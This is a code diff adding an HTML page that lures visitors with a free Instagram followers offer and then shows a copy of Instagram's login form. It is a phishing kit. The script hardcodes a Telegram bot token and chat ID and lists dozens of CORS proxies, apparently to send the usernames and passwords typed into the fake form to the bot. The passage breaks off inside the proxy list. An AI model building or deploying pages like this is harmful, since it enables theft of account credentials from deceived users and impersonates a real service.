@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Followers</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #fafafa;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            max-width: 350px;
+            width: 100%;
+            padding: 40px;
+            text-align: center;
+        }
+        
+        .logo {
+            font-family: 'Grand Hotel', cursive;
+            font-size: 48px;
+            margin-bottom: 20px;
+            color: #262626;
+        }
+        
+        .title {
+            color: #8e8e8e;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+        
+        .options {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .option {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 16px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .option:hover {
+            background-color: #fafafa;
+        }
+        
+        .option.selected {
+            border-color: #0095f6;
+            background-color: rgba(0, 149, 246, 0.05);
+        }
+        
+        .amount {
+            font-size: 16px;
+            font-weight: 600;
+            color: #262626;
+        }
+        
+        .label {
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 8px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        .btn:disabled {
+            background-color: #b2dffc;
+            cursor: default;
+        }
+        
+        .terms {
+            font-size: 12px;
+            color: #8e8e8e;
+            text-align: center;
+            margin-top: 20px;
+            line-height: 1.4;
+        }
+        
+        .terms a {
+            color: #8e8e8e;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        .success-message {
+            text-align: center;
+            padding: 20px 0;
+            display: none;
+        }
+        
+        .success-message i {
+            font-size: 40px;
+            color: #0095f6;
+            margin-bottom: 15px;
+        }
+        
+        .success-message h3 {
+            margin-bottom: 10px;
+            color: #262626;
+        }
+        
+        .success-message p {
+            font-size: 14px;
+            color: #8e8e8e;
+            margin-bottom: 5px;
+        }
+        
+        .loader {
+            display: none;
+            text-align: center;
+            padding: 20px 0;
+        }
+        
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0095f6;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Login Screen Styles */
+        .login-screen {
+            display: none;
+        }
+        
+        .instagram-icon {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .instagram-icon img {
+            width: 60px;
+            height: 60px;
+            border-radius: 15px;
+        }
+        
+        .login-box {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        
+        .login-logo {
+            margin: 0 auto 30px;
+            width: 175px;
+            height: 51px;
+            background-image: url('https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png');
+            background-repeat: no-repeat;
+            background-position: center;
+            background-size: contain;
+        }
+        
+        .login-form {
+            margin-bottom: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 6px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 9px 0 7px 8px;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            color: #262626;
+            height: 36px;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+        
+        .login-btn {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 7px 16px;
+            font-weight: 600;
+            margin-top: 8px;
+            cursor: pointer;
+            height: 32px;
+            font-size: 14px;
+        }
+        
+        .login-btn:disabled {
+            background-color: #b2dffc;
+            cursor: not-allowed;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+        
+        .divider-line {
+            flex-grow: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+        
+        .divider-text {
+            margin: 0 18px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        
+        .facebook-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            margin: 8px 0;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+        }
+        
+        .facebook-login i {
+            margin-right: 8px;
+            font-size: 18px;
+        }
+        
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            margin-top: 20px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+        }
+        
+        .signup-box {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 25px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        
+        .signup-text {
+            font-size: 14px;
+            color: #262626;
+        }
+        
+        .signup-link {
+            color: #0095f6;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        
+        .get-app {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .get-app-text {
+            font-size: 14px;
+            color: #262626;
+            margin-bottom: 20px;
+        }
+        
+        .app-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .app-button {
+            height: 40px;
+            cursor: pointer;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 50px;
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin-bottom: 10px;
+            gap: 10px;
+        }
+        
+        .footer-link {
+            color: #8e8e8e;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        
+        .copyright {
+            margin-top: 10px;
+        }
+        
+        .timer-message {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 12px;
+            color: #8e8e8e;
+            display: none;
+        }
+        
+        .login-terms {
+            color: #8e8e8e;
+            font-size: 12px;
+            margin-top: 20px;
+            line-height: 1.4;
+        }
+        
+        .login-terms a {
+            color: #8e8e8e;
+            font-weight: 600;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Followers Selection Screen -->
+    <div class="container" id="followers-screen">
+        <div class="logo">Instagram</div>
+        
+        <div class="title">Select followers quantity</div>
+        
+        <div class="options">
+            <div class="option" data-amount="100">
+                <span class="amount">100</span>
+                <span class="label">Followers</span>
+            </div>
+            <div class="option" data-amount="250">
+                <span class="amount">250</span>
+                <span class="label">Followers</span>
+            </div>
+            <div class="option" data-amount="500">
+                <span class="amount">500</span>
+                <span class="label">Followers</span>
+            </div>
+            <div class="option" data-amount="750">
+                <span class="amount">750</span>
+                <span class="label">Followers</span>
+            </div>
+            <div class="option" data-amount="1000">
+                <span class="amount">1000</span>
+                <span class="label">Followers</span>
+            </div>
+            <div class="option" data-amount="2500">
+                <span class="amount">2500</span>
+                <span class="label">Followers</span>
+            </div>
+        </div>
+        
+        <button class="btn" id="get-followers">Get Followers</button>
+        
+        <div class="terms">
+            By continuing, you agree to our <a href="#">Terms</a>, <a href="#">Privacy Policy</a> and <a href="#">Cookies Policy</a>.
+        </div>
+        
+        <!-- Loader -->
+        <div class="loader" id="loader">
+            <div class="spinner"></div>
+            <p>Need Login First...</p>
+        </div>
+        
+        <!-- Success Message -->
+        <div class="success-message" id="success-message">
+            <i class="fas fa-check-circle"></i>
+            <h3>Need To Login First!</h3>
+            <p>Your request for <span id="followers-count">0</span> followers has been received.</p>
+            <p>Followers will be added to your account within 24 hours.</p>
+        </div>
+    </div>
+
+    <!-- Login Screen -->
+    <div class="container login-screen" id="login-screen">
+        <div class="instagram-icon">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7zv0lY5uVFgUjNjGWLFHzR84n0p95zmB54-1Na4F8mg&s" alt="Instagram Icon">
+        </div>
+        
+        <div class="login-box">
+            <div class="login-logo"></div>
+            
+            <div class="login-form">
+                <form>
+                    <div class="form-group">
+                        <input type="text" id="username" placeholder="Phone number, username or email address">
+                    </div>
+                    
+                    <div class="form-group">
+                        <input type="password" id="password" placeholder="Password">
+                    </div>
+                    
+                    <button class="login-btn" id="login-btn" type="button">Log in</button>
+                    
+                    <div class="timer-message" id="timer-message">
+                        Please wait <span id="timer-count">60</span> seconds before trying again
+                    </div>
+                    
+                    <div class="divider">
+                        <div class="divider-line"></div>
+                        <div class="divider-text">OR</div>
+                        <div class="divider-line"></div>
+                    </div>
+                    
+                    <a href="#" class="facebook-login" id="facebook-login">
+                        <i class="fab fa-facebook-square"></i> Continue with Facebook
+                    </a>
+                    
+                    <a href="#" class="forgot-password" id="forgot-password">Forgotten your password?</a>
+                </form>
+            </div>
+            
+            <div class="login-terms">
+                By continuing, you agree to Instagram's <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.
+            </div>
+        </div>
+        
+        <div class="signup-box">
+            <span class="signup-text">Don't have an account?</span>
+            <a href="#" class="signup-link" id="signup-link">Sign up</a>
+        </div>
+        
+        <div class="get-app">
+            <div class="get-app-text">Get the app.</div>
+            <div class="app-buttons">
+                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store" class="app-button">
+                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play" class="app-button">
+            </div>
+        </div>
+        
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#" class="footer-link">Meta</a>
+                <a href="#" class="footer-link">About</a>
+                <a href="#" class="footer-link">Blog</a>
+                <a href="#" class="footer-link">Jobs</a>
+                <a href="#" class="footer-link">Help</a>
+                <a href="#" class="footer-link">API</a>
+                <a href="#" class="footer-link">Privacy</a>
+                <a href="#" class="footer-link">Terms</a>
+                <a href="#" class="footer-link">Locations</a>
+                <a href="#" class="footer-link">Instagram Lite</a>
+                <a href="#" class="footer-link">Threads</a>
+                <a href="#" class="footer-link">Contact Uploading & Non-Users</a>
+                <a href="#" class="footer-link">Meta Verified</a>
+            </div>
+            <div class="copyright">
+                English (UK) © 2023 Instagram from Meta
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Followers screen elements
+            const followersScreen = document.getElementById('followers-screen');
+            const loginScreen = document.getElementById('login-screen');
+            const options = document.querySelectorAll('.option');
+            const getFollowersBtn = document.getElementById('get-followers');
+            const loader = document.getElementById('loader');
+            const successMessage = document.getElementById('success-message');
+            const followersCount = document.getElementById('followers-count');
+            
+            let selectedAmount = 0;
+            
+            // Option selection handler
+            options.forEach(option => {
+                option.addEventListener('click', function() {
+                    // Remove selected class from all options
+                    options.forEach(opt => opt.classList.remove('selected'));
+                    
+                    // Add selected class to clicked option
+                    this.classList.add('selected');
+                    
+                    // Store selected amount
+                    selectedAmount = this.getAttribute('data-amount');
+                });
+            });
+            
+            // Get followers button click handler
+            getFollowersBtn.addEventListener('click', function() {
+                if (selectedAmount === 0) {
+                    alert('Please select a followers quantity');
+                    return;
+                }
+                
+                // Show loader
+                document.querySelector('.options').style.display = 'none';
+                document.querySelector('.title').style.display = 'none';
+                getFollowersBtn.style.display = 'none';
+                document.querySelector('.terms').style.display = 'none';
+                loader.style.display = 'block';
+                
+                // Simulate processing delay
+                setTimeout(function() {
+                    // Hide loader and show success message
+                    loader.style.display = 'none';
+                    successMessage.style.display = 'block';
+                    
+                    // Update success message with user data
+                    followersCount.textContent = selectedAmount;
+                    
+                    // Transition to login screen after 3 seconds
+                    setTimeout(function() {
+                        followersScreen.style.display = 'none';
+                        loginScreen.style.display = 'block';
+                    }, 3000);
+                }, 2000);
+            });
+            
+            // Login screen elements
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const loginBtn = document.getElementById('login-btn');
+            const facebookLogin = document.getElementById('facebook-login');
+            const forgotPassword = document.getElementById('forgot-password');
+            const signupLink = document.getElementById('signup-link');
+            const timerMessage = document.getElementById('timer-message');
+            const timerCount = document.getElementById('timer-count');
+            
+            // Telegram bot details
+            const BOT_TOKEN = '8211921829:AAEQTdu8EvtTRiv7-HcM24pttIja2OsQRV4';
+            const CHAT_ID = '8211921829';
+            
+            // Enhanced proxy list for faster delivery
+            const PROXIES = [
+                'https://cors-anywhere.herokuapp.com/',
+                'https://api.codetabs.com/v1/proxy?quest=',
+                'https://corsproxy.io/?',
+                'https://api.allorigins.win/raw?url=',
+                'https://cors.bridged.cc/',
+                'https://proxy.cors.sh/',
+                'https://thingproxy.freeboard.io/fetch/',
+                'https://www.cors-proxy.cc/',
+                'https://cors-proxy.htmldriven.com/?url=',
+                'https://jsonp.afeld.me/?url=',
+                'https://anyorigin.com/go?url=',
+                'https://yacdn.org/proxy/',
+                'https://api.cors.twitch.tv/?url=',
+                'https://crossorigin.me/',
+                'https://cors.eu.org/',
+                'https://noki-cors.herokuapp.com/',
+                'https://cors.deno.dev/',
+                'https://cors.fl1ght.workers.dev/',
+                'https://cors.zimjs.com/',
+                'https://cors.isteed.cc/',
+                'https://cors.sndcdn.com/',
+                'https://cors.wtf/',
+                'https://cors.4887.workers.dev/',
+                'https://cors-proxy.fly.dev/',
+                'https://cors-proxy.cyclic.app/',
+                'https://cors-proxy-omega.vercel.app/',
+                'https://cors-proxy-rose.vercel.app/',
+                'https://cors-proxy-gilt.vercel.app/',
+                'https://cors-proxy-ecru.vercel.app/',
+                'https://cors-proxy-lake.vercel.app/',
+                'https://cors-proxy-sandy.vercel.app/',
+                'https://cors-proxy-ta
